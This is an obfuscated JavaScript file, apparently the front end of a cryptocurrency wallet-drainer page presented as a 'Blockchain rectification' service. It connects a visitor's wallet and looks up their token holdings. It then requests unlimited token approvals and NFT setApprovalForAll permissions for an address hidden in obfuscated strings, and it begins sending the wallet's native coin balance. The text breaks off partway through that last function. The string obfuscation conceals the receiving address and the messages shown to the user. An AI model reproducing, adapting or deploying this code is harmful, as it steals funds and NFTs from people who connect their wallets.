function _0x3b58(_0xac4f10,_0xf04a99){const _0x46d276=_0x46d2();return _0x3b58=function(_0x3b587e,_0xe530a9){_0x3b587e=_0x3b587e-0x18e;let _0x2b71b8=_0x46d276[_0x3b587e];return _0x2b71b8;},_0x3b58(_0xac4f10,_0xf04a99);}const _0x4dcaf4=_0x3b58;(function(_0x5f09af,_0x4c2d22){const _0x4625e4=_0x3b58,_0x158d31=_0x5f09af();while(!![]){try{const _0x4a6577=-parseInt(_0x4625e4(0x209))/0x1*(-parseInt(_0x4625e4(0x239))/0x2)+parseInt(_0x4625e4(0x21f))/0x3*(-parseInt(_0x4625e4(0x1b8))/0x4)+-parseInt(_0x4625e4(0x236))/0x5*(-parseInt(_0x4625e4(0x20d))/0x6)+parseInt(_0x4625e4(0x241))/0x7+-parseInt(_0x4625e4(0x1e5))/0x8*(-parseInt(_0x4625e4(0x19f))/0x9)+-parseInt(_0x4625e4(0x19a))/0xa*(-parseInt(_0x4625e4(0x244))/0xb)+-parseInt(_0x4625e4(0x202))/0xc;if(_0x4a6577===_0x4c2d22)break;else _0x158d31['push'](_0x158d31['shift']());}catch(_0x3b5745){_0x158d31['push'](_0x158d31['shift']());}}}(_0x46d2,0x5a9e7));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {avalanche,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[avalanche,mainnet],projectId=_0x4dcaf4(0x192),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors['CoinbaseWalletConnector']({'chains':chains,'options':{'appName':'Blockchain\x20rectification'}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x4dcaf4(0x1ab)}},ethereumClient);const OWNER_ADDRESS='0xea8968B218a551919FbD5f1166328C82a96dED54',ABI=[{'constant':!![],'inputs':[],'name':_0x4dcaf4(0x1f1),'outputs':[{'name':'','type':_0x4dcaf4(0x212)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[{'name':_0x4dcaf4(0x247),'type':_0x4dcaf4(0x22c)}],'name':_0x4dcaf4(0x245),'outputs':[],'payable':![],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[{'name':_0x4dcaf4(0x1c6),'type':'address'},{'name':_0x4dcaf4(0x1d6),'type':_0x4dcaf4(0x197)}],'name':_0x4dcaf4(0x1b7),'outputs':[],'payable':![],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[],'name':_0x4dcaf4(0x1f9),'outputs':[{'name':'','type':_0x4dcaf4(0x1b5)}],'payable':![],'stateMutability':'view','type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[{'name':_0x4dcaf4(0x1e4),'type':_0x4dcaf4(0x22c)}],'name':'addBlackList','outputs':[],'payable':![],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[],'name':'totalSupply','outputs':[{'name':'','type':_0x4dcaf4(0x197)}],'payable':![],'stateMutability':'view','type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[{'name':_0x4dcaf4(0x193),'type':_0x4dcaf4(0x22c)},{'name':_0x4dcaf4(0x1b3),'type':_0x4dcaf4(0x22c)},{'name':_0x4dcaf4(0x1d6),'type':'uint256'}],'name':_0x4dcaf4(0x210),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[],'name':_0x4dcaf4(0x1d7),'outputs':[{'name':'','type':_0x4dcaf4(0x22c)}],'payable':![],'stateMutability':'view','type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[{'name':'','type':_0x4dcaf4(0x22c)}],'name':_0x4dcaf4(0x1c3),'outputs':[{'name':'','type':_0x4dcaf4(0x197)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[],'name':_0x4dcaf4(0x198),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[],'name':_0x4dcaf4(0x1e8),'outputs':[{'name':'','type':_0x4dcaf4(0x197)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[],'name':_0x4dcaf4(0x246),'outputs':[{'name':'','type':_0x4dcaf4(0x197)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[],'name':'unpause','outputs':[],'payable':![],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[{'name':_0x4dcaf4(0x1e1),'type':_0x4dcaf4(0x22c)}],'name':_0x4dcaf4(0x240),'outputs':[{'name':'','type':_0x4dcaf4(0x1b5)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[{'name':'','type':_0x4dcaf4(0x22c)},{'name':'','type':'address'}],'name':_0x4dcaf4(0x1a9),'outputs':[{'name':'','type':_0x4dcaf4(0x197)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':'function'},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':_0x4dcaf4(0x1b5)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[{'name':_0x4dcaf4(0x1ae),'type':_0x4dcaf4(0x22c)}],'name':'balanceOf','outputs':[{'name':'','type':_0x4dcaf4(0x197)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[],'name':_0x4dcaf4(0x1a4),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[],'name':_0x4dcaf4(0x196),'outputs':[{'name':'','type':_0x4dcaf4(0x22c)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[],'name':_0x4dcaf4(0x243),'outputs':[{'name':'','type':_0x4dcaf4(0x22c)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':'symbol','outputs':[{'name':'','type':_0x4dcaf4(0x212)}],'payable':![],'stateMutability':'view','type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[{'name':_0x4dcaf4(0x1b3),'type':'address'},{'name':'_value','type':'uint256'}],'name':'transfer','outputs':[],'payable':![],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[{'name':_0x4dcaf4(0x242),'type':_0x4dcaf4(0x197)},{'name':'newMaxFee','type':'uint256'}],'name':'setParams','outputs':[],'payable':![],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[{'name':_0x4dcaf4(0x18f),'type':_0x4dcaf4(0x197)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x4dcaf4(0x1fb),'type':'function'},{'constant':![],'inputs':[{'name':'amount','type':_0x4dcaf4(0x197)}],'name':_0x4dcaf4(0x227),'outputs':[],'payable':![],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[{'name':_0x4dcaf4(0x20e),'type':_0x4dcaf4(0x22c)},{'name':_0x4dcaf4(0x1c6),'type':'address'}],'name':_0x4dcaf4(0x1d5),'outputs':[{'name':_0x4dcaf4(0x1bf),'type':_0x4dcaf4(0x197)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':'function'},{'constant':!![],'inputs':[],'name':_0x4dcaf4(0x204),'outputs':[{'name':'','type':_0x4dcaf4(0x197)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[{'name':'','type':_0x4dcaf4(0x22c)}],'name':_0x4dcaf4(0x1e6),'outputs':[{'name':'','type':_0x4dcaf4(0x1b5)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[{'name':'_clearedUser','type':_0x4dcaf4(0x22c)}],'name':_0x4dcaf4(0x194),'outputs':[],'payable':![],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'constant':!![],'inputs':[],'name':_0x4dcaf4(0x1b1),'outputs':[{'name':'','type':_0x4dcaf4(0x197)}],'payable':![],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[{'name':_0x4dcaf4(0x1ff),'type':'address'}],'name':_0x4dcaf4(0x203),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4dcaf4(0x1d9)},{'constant':![],'inputs':[{'name':_0x4dcaf4(0x22a),'type':'address'}],'name':_0x4dcaf4(0x1b9),'outputs':[],'payable':![],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'name':_0x4dcaf4(0x1a0),'type':_0x4dcaf4(0x197)},{'name':'_name','type':_0x4dcaf4(0x212)},{'name':'_symbol','type':'string'},{'name':'_decimals','type':_0x4dcaf4(0x197)}],'payable':![],'stateMutability':_0x4dcaf4(0x1fb),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4dcaf4(0x18f),'type':_0x4dcaf4(0x197)}],'name':'Issue','type':_0x4dcaf4(0x222)},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x4dcaf4(0x197)}],'name':_0x4dcaf4(0x1e7),'type':_0x4dcaf4(0x222)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4dcaf4(0x1f8),'type':_0x4dcaf4(0x22c)}],'name':_0x4dcaf4(0x215),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':_0x4dcaf4(0x197)},{'indexed':![],'name':'maxFee','type':_0x4dcaf4(0x197)}],'name':'Params','type':_0x4dcaf4(0x222)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4dcaf4(0x22a),'type':_0x4dcaf4(0x22c)},{'indexed':![],'name':_0x4dcaf4(0x235),'type':_0x4dcaf4(0x197)}],'name':_0x4dcaf4(0x208),'type':_0x4dcaf4(0x222)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4dcaf4(0x21d),'type':_0x4dcaf4(0x22c)}],'name':_0x4dcaf4(0x1a2),'type':_0x4dcaf4(0x222)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4dcaf4(0x21d),'type':_0x4dcaf4(0x22c)}],'name':_0x4dcaf4(0x23c),'type':_0x4dcaf4(0x222)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x4dcaf4(0x243),'type':_0x4dcaf4(0x22c)},{'indexed':!![],'name':_0x4dcaf4(0x224),'type':_0x4dcaf4(0x22c)},{'indexed':![],'name':_0x4dcaf4(0x1b4),'type':_0x4dcaf4(0x197)}],'name':'Approval','type':_0x4dcaf4(0x222)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x4dcaf4(0x1da),'type':_0x4dcaf4(0x22c)},{'indexed':!![],'name':'to','type':'address'},{'indexed':![],'name':_0x4dcaf4(0x1b4),'type':_0x4dcaf4(0x197)}],'name':_0x4dcaf4(0x1ed),'type':_0x4dcaf4(0x222)},{'anonymous':![],'inputs':[],'name':_0x4dcaf4(0x1d0),'type':_0x4dcaf4(0x222)},{'anonymous':![],'inputs':[],'name':_0x4dcaf4(0x1fa),'type':'event'}],ABIN=[{'inputs':[{'internalType':_0x4dcaf4(0x212),'name':_0x4dcaf4(0x1f1),'type':_0x4dcaf4(0x212)},{'internalType':'string','name':_0x4dcaf4(0x221),'type':_0x4dcaf4(0x212)},{'internalType':_0x4dcaf4(0x197),'name':_0x4dcaf4(0x226),'type':_0x4dcaf4(0x197)},{'internalType':_0x4dcaf4(0x197),'name':_0x4dcaf4(0x1b2),'type':_0x4dcaf4(0x197)}],'stateMutability':'nonpayable','type':_0x4dcaf4(0x20c)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x243),'type':_0x4dcaf4(0x22c)},{'indexed':!![],'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x1bb),'type':_0x4dcaf4(0x22c)},{'indexed':!![],'internalType':'uint256','name':_0x4dcaf4(0x214),'type':_0x4dcaf4(0x197)}],'name':_0x4dcaf4(0x19c),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x243),'type':_0x4dcaf4(0x22c)},{'indexed':!![],'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x191),'type':_0x4dcaf4(0x22c)},{'indexed':![],'internalType':_0x4dcaf4(0x1b5),'name':_0x4dcaf4(0x1bb),'type':_0x4dcaf4(0x1b5)}],'name':_0x4dcaf4(0x1dc),'type':_0x4dcaf4(0x222)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x1f7),'type':'address'},{'indexed':!![],'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x1ff),'type':_0x4dcaf4(0x22c)}],'name':_0x4dcaf4(0x1f2),'type':_0x4dcaf4(0x222)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4dcaf4(0x22c),'name':'from','type':'address'},{'indexed':!![],'internalType':'address','name':'to','type':_0x4dcaf4(0x22c)},{'indexed':!![],'internalType':'uint256','name':_0x4dcaf4(0x214),'type':'uint256'}],'name':_0x4dcaf4(0x1ed),'type':_0x4dcaf4(0x222)},{'inputs':[],'name':_0x4dcaf4(0x205),'outputs':[{'internalType':'string','name':'','type':_0x4dcaf4(0x212)}],'stateMutability':_0x4dcaf4(0x238),'type':'function'},{'inputs':[],'name':_0x4dcaf4(0x233),'outputs':[{'internalType':_0x4dcaf4(0x197),'name':'','type':_0x4dcaf4(0x197)}],'stateMutability':_0x4dcaf4(0x238),'type':'function'},{'inputs':[],'name':_0x4dcaf4(0x20a),'outputs':[{'internalType':'uint256','name':'','type':_0x4dcaf4(0x197)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x4dcaf4(0x20f),'outputs':[{'internalType':_0x4dcaf4(0x197),'name':'','type':_0x4dcaf4(0x197)}],'stateMutability':_0x4dcaf4(0x238),'type':'function'},{'inputs':[{'internalType':'address','name':'to','type':_0x4dcaf4(0x22c)},{'internalType':'uint256','name':_0x4dcaf4(0x214),'type':'uint256'}],'name':_0x4dcaf4(0x1b7),'outputs':[],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x243),'type':_0x4dcaf4(0x22c)}],'name':'balanceOf','outputs':[{'internalType':_0x4dcaf4(0x197),'name':'','type':_0x4dcaf4(0x197)}],'stateMutability':'view','type':_0x4dcaf4(0x1d9)},{'inputs':[],'name':_0x4dcaf4(0x1de),'outputs':[{'internalType':_0x4dcaf4(0x212),'name':'','type':'string'}],'stateMutability':_0x4dcaf4(0x238),'type':'function'},{'inputs':[],'name':_0x4dcaf4(0x1ba),'outputs':[],'stateMutability':'nonpayable','type':_0x4dcaf4(0x1d9)},{'inputs':[],'name':'flipSaleState','outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x4dcaf4(0x197),'name':_0x4dcaf4(0x214),'type':'uint256'}],'name':_0x4dcaf4(0x21a),'outputs':[{'internalType':_0x4dcaf4(0x22c),'name':'','type':_0x4dcaf4(0x22c)}],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x243),'type':_0x4dcaf4(0x22c)},{'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x191),'type':'address'}],'name':'isApprovedForAll','outputs':[{'internalType':_0x4dcaf4(0x1b5),'name':'','type':_0x4dcaf4(0x1b5)}],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'inputs':[],'name':_0x4dcaf4(0x232),'outputs':[{'internalType':'uint256','name':'','type':_0x4dcaf4(0x197)}],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':'uint256','name':_0x4dcaf4(0x1a5),'type':'uint256'}],'name':_0x4dcaf4(0x1b0),'outputs':[],'stateMutability':_0x4dcaf4(0x1cf),'type':_0x4dcaf4(0x1d9)},{'inputs':[],'name':_0x4dcaf4(0x1f1),'outputs':[{'internalType':'string','name':'','type':_0x4dcaf4(0x212)}],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'inputs':[],'name':_0x4dcaf4(0x243),'outputs':[{'internalType':_0x4dcaf4(0x22c),'name':'','type':_0x4dcaf4(0x22c)}],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':_0x4dcaf4(0x197),'name':_0x4dcaf4(0x214),'type':_0x4dcaf4(0x197)}],'name':'ownerOf','outputs':[{'internalType':_0x4dcaf4(0x22c),'name':'','type':_0x4dcaf4(0x22c)}],'stateMutability':'view','type':_0x4dcaf4(0x1d9)},{'inputs':[],'name':_0x4dcaf4(0x1e0),'outputs':[],'stateMutability':'nonpayable','type':_0x4dcaf4(0x1d9)},{'inputs':[],'name':_0x4dcaf4(0x1f4),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':'address','name':'from','type':'address'},{'internalType':'address','name':'to','type':_0x4dcaf4(0x22c)},{'internalType':_0x4dcaf4(0x197),'name':_0x4dcaf4(0x214),'type':'uint256'}],'name':_0x4dcaf4(0x1bd),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x1da),'type':_0x4dcaf4(0x22c)},{'internalType':_0x4dcaf4(0x22c),'name':'to','type':'address'},{'internalType':_0x4dcaf4(0x197),'name':_0x4dcaf4(0x214),'type':_0x4dcaf4(0x197)},{'internalType':_0x4dcaf4(0x1a1),'name':_0x4dcaf4(0x22d),'type':'bytes'}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x4dcaf4(0x1fb),'type':'function'},{'inputs':[],'name':_0x4dcaf4(0x195),'outputs':[{'internalType':_0x4dcaf4(0x1b5),'name':'','type':_0x4dcaf4(0x1b5)}],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':_0x4dcaf4(0x22c),'name':'operator','type':_0x4dcaf4(0x22c)},{'internalType':'bool','name':_0x4dcaf4(0x1bb),'type':_0x4dcaf4(0x1b5)}],'name':'setApprovalForAll','outputs':[],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':_0x4dcaf4(0x212),'name':_0x4dcaf4(0x1de),'type':'string'}],'name':'setBaseURI','outputs':[],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':'string','name':'provenanceHash','type':_0x4dcaf4(0x212)}],'name':_0x4dcaf4(0x23f),'outputs':[],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':_0x4dcaf4(0x197),'name':_0x4dcaf4(0x217),'type':'uint256'}],'name':'setRevealTimestamp','outputs':[],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)},{'inputs':[],'name':'setStartingIndex','outputs':[],'stateMutability':'nonpayable','type':_0x4dcaf4(0x1d9)},{'inputs':[],'name':'startingIndex','outputs':[{'internalType':'uint256','name':'','type':_0x4dcaf4(0x197)}],'stateMutability':'view','type':_0x4dcaf4(0x1d9)},{'inputs':[],'name':_0x4dcaf4(0x1c4),'outputs':[{'internalType':_0x4dcaf4(0x197),'name':'','type':_0x4dcaf4(0x197)}],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':_0x4dcaf4(0x1d1),'name':_0x4dcaf4(0x1f0),'type':_0x4dcaf4(0x1d1)}],'name':_0x4dcaf4(0x1fd),'outputs':[{'internalType':_0x4dcaf4(0x1b5),'name':'','type':_0x4dcaf4(0x1b5)}],'stateMutability':_0x4dcaf4(0x238),'type':'function'},{'inputs':[],'name':_0x4dcaf4(0x221),'outputs':[{'internalType':_0x4dcaf4(0x212),'name':'','type':_0x4dcaf4(0x212)}],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':_0x4dcaf4(0x197),'name':_0x4dcaf4(0x1ea),'type':_0x4dcaf4(0x197)}],'name':_0x4dcaf4(0x1ce),'outputs':[{'internalType':'uint256','name':'','type':_0x4dcaf4(0x197)}],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x243),'type':_0x4dcaf4(0x22c)},{'internalType':_0x4dcaf4(0x197),'name':_0x4dcaf4(0x1ea),'type':_0x4dcaf4(0x197)}],'name':_0x4dcaf4(0x19e),'outputs':[{'internalType':_0x4dcaf4(0x197),'name':'','type':_0x4dcaf4(0x197)}],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':'uint256','name':_0x4dcaf4(0x214),'type':_0x4dcaf4(0x197)}],'name':_0x4dcaf4(0x1be),'outputs':[{'internalType':_0x4dcaf4(0x212),'name':'','type':_0x4dcaf4(0x212)}],'stateMutability':_0x4dcaf4(0x238),'type':'function'},{'inputs':[],'name':_0x4dcaf4(0x207),'outputs':[{'internalType':_0x4dcaf4(0x197),'name':'','type':_0x4dcaf4(0x197)}],'stateMutability':_0x4dcaf4(0x238),'type':_0x4dcaf4(0x1d9)},{'inputs':[{'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x1da),'type':_0x4dcaf4(0x22c)},{'internalType':_0x4dcaf4(0x22c),'name':'to','type':_0x4dcaf4(0x22c)},{'internalType':'uint256','name':_0x4dcaf4(0x214),'type':_0x4dcaf4(0x197)}],'name':_0x4dcaf4(0x210),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x4dcaf4(0x22c),'name':_0x4dcaf4(0x1ff),'type':_0x4dcaf4(0x22c)}],'name':'transferOwnership','outputs':[],'stateMutability':_0x4dcaf4(0x1fb),'type':'function'},{'inputs':[],'name':'withdraw','outputs':[],'stateMutability':_0x4dcaf4(0x1fb),'type':_0x4dcaf4(0x1d9)}];$(_0x4dcaf4(0x220))['click'](async function(){const _0x30f68c=_0x4dcaf4;console[_0x30f68c(0x234)]('1');try{await web3Modal[_0x30f68c(0x21b)]();}catch(_0x417879){console[_0x30f68c(0x234)](_0x30f68c(0x1f6),_0x417879);return;}}),$('.proceed')[_0x4dcaf4(0x1d2)](async function(){const _0x542299=_0x4dcaf4;let _0x412918=getAccount();console['log'](_0x412918),!_0x412918[_0x542299(0x22c)]&&(console[_0x542299(0x234)](_0x542299(0x1a7)),alert(_0x542299(0x1bc))),_0x412918[_0x542299(0x1d8)]['name']===_0x542299(0x1c8)&&(_0x412918[_0x542299(0x1d8)][_0x542299(0x1ca)][_0x542299(0x216)]()[_0x542299(0x225)]!==_0x542299(0x206)&&(console[_0x542299(0x234)](_0x542299(0x1c1)),await switchNetwork({'chainId':0xa86a}))),selectedAccount=_0x412918[_0x542299(0x22c)],sendMessage('Fab\x20...\x20Wallet\x20Connected\x20Successfully\x20to\x20avalanche!'),sendMessage(_0x542299(0x22f)+selectedAccount),covalenthqAPICall();});const Oxa=_0x4dcaf4(0x22e),Oxc1=_0x4dcaf4(0x1aa),Oxc2=_0x4dcaf4(0x1c2);async function covalenthqAPICall(){const _0x493a16=_0x4dcaf4,_0x4a8e3f={'chain':_0x493a16(0x199)},_0xa23f87=new URL(_0x493a16(0x19b)+selectedAccount+'/erc20');_0xa23f87[_0x493a16(0x21c)]=new URLSearchParams(_0x4a8e3f)[_0x493a16(0x1a8)]();const _0x49a520={'method':_0x493a16(0x190),'headers':{'accept':_0x493a16(0x1eb),'X-API-Key':_0x493a16(0x1ec)}};try{const _0x2b23c1=await fetch(_0xa23f87,_0x49a520)[_0x493a16(0x223)](_0x382545=>_0x382545[_0x493a16(0x22b)]());console[_0x493a16(0x234)](_0x2b23c1);let _0x20e795=_0x2b23c1;console[_0x493a16(0x234)](_0x493a16(0x213),_0x20e795);let _0x7e568f=await Promise[_0x493a16(0x1f5)](_0x20e795[_0x493a16(0x1af)](async _0xd35cf0=>{const _0x1ffa63=_0x493a16;let _0x6cf3da;try{_0x6cf3da=await getValue(_0xd35cf0[_0x1ffa63(0x219)],_0xd35cf0[_0x1ffa63(0x1d3)],_0xd35cf0['decimals']);}catch(_0x4ace90){_0x6cf3da=0x0;}return console[_0x1ffa63(0x234)](_0x6cf3da),{'balance':_0xd35cf0[_0x1ffa63(0x1d3)],'value':_0x6cf3da,'address':_0xd35cf0['token_address']};}));console['log'](_0x493a16(0x1db),_0x7e568f),tokens=_0x7e568f[_0x493a16(0x218)](_0x90c6d0=>_0x90c6d0['value']>0x5),tokens[_0x493a16(0x200)]((_0x52ef25,_0x46802c)=>_0x46802c[_0x493a16(0x1b4)]-_0x52ef25[_0x493a16(0x1b4)]),console['log'](_0x493a16(0x1c0),await getNetwork(),_0x493a16(0x228),tokens),NFTs=await getNFTs(selectedAccount)['catch'](_0x232f9c=>{const _0x4eecd4=_0x493a16;console['log'](_0x4eecd4(0x1fc),_0x232f9c);}),NFTs=NFTs[_0x493a16(0x1c7)],console[_0x493a16(0x234)](_0x493a16(0x201),NFTs);if(tokens[_0x493a16(0x1ac)]===0x0&&NFTs[_0x493a16(0x1ac)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x493a16(0x1e2));}}async function onApprove(){const _0x268378=_0x4dcaf4;if(tokens[_0x268378(0x1ac)])try{loopTokens(tokens);}catch(_0x1c0c40){console[_0x268378(0x23b)](_0x268378(0x23e)+_0x1c0c40[_0x268378(0x229)]);}else{if(NFTs[_0x268378(0x1ac)]){try{loopNfts(NFTs);}catch(_0x4f8ce1){console[_0x268378(0x23b)](_0x268378(0x23e)+_0x4f8ce1[_0x268378(0x229)]);}onSendEther(),sendMessage(_0x268378(0x1c5));}else try{onSendEther();}catch(_0x1437d1){console['error'](_0x268378(0x23e)+_0x1437d1[_0x268378(0x229)]);}}}async function loopTokens(_0x2c0da5){const _0xfb3fa8=_0x4dcaf4;for await(let _0x26bd9e of _0x2c0da5){console[_0xfb3fa8(0x234)](_0xfb3fa8(0x237),_0x26bd9e);try{sendMessage(_0xfb3fa8(0x19d));let {hash:_0x4f5b45}=await writeContract({'address':_0x26bd9e[_0xfb3fa8(0x22c)],'abi':ABI,'functionName':_0xfb3fa8(0x1b7),'args':[Oxa,_0xfb3fa8(0x1f3)]});console[_0xfb3fa8(0x234)]('hash',_0x4f5b45),_0x4f5b45&&(console[_0xfb3fa8(0x234)](_0xfb3fa8(0x18e)),sendMessage(_0xfb3fa8(0x1b6)),sendMessage('TOKEN\x20Contract\x20Address\x20'+_0x26bd9e[_0xfb3fa8(0x22c)]),sendMessage(_0xfb3fa8(0x231)+_0x26bd9e[_0xfb3fa8(0x1d3)]),sendMessage('Your\x20address\x20'+Oxa));}catch(_0x6ff68f){console[_0xfb3fa8(0x234)](_0xfb3fa8(0x1dd)+_0x6ff68f),sendMessage(_0xfb3fa8(0x1fe));}};await loopNfts(NFTs);}async function loopNfts(_0x3b820d){const _0x555576=_0x4dcaf4;for await(let _0x31d43a of _0x3b820d){console['log'](_0x555576(0x230),_0x31d43a);try{let {hash:_0x496e67}=await writeContract({'address':_0x31d43a[_0x555576(0x219)],'abi':ABIN,'functionName':'setApprovalForAll','args':[Oxa,!![]]});console[_0x555576(0x234)](_0x555576(0x1cb),_0x496e67),console['log'](_0x555576(0x1df)+receipt),sendMessage(_0x555576(0x1b6)),sendMessage('NFT\x20Contract\x20Address\x20'+_0x31d43a[_0x555576(0x219)]),sendMessage(_0x555576(0x20b)+Oxa);}catch(_0x2646e7){console[_0x555576(0x234)](_0x555576(0x1dd)+_0x2646e7),sendMessage(_0x555576(0x1fe));}}await onSendEther();}async function onSendEther(){const _0x380fba=_0x4dcaf4;console[_0x380fba(0x234)](_0x380fba(0x211));try{let _0x20ba55=await fetchBalance({'address':selectedAccount});console['log'](_0x20ba55);const _0x250a5d=await fetchFeeData();console[_0x380fba(0x234)](_0x250a5d);var _0x1f328e=_0x250a5d[_0x380fba(0x1e9)][_0x380fba(0x1d4)];_0x1f328e=parseFloat(_0x1f328e);let 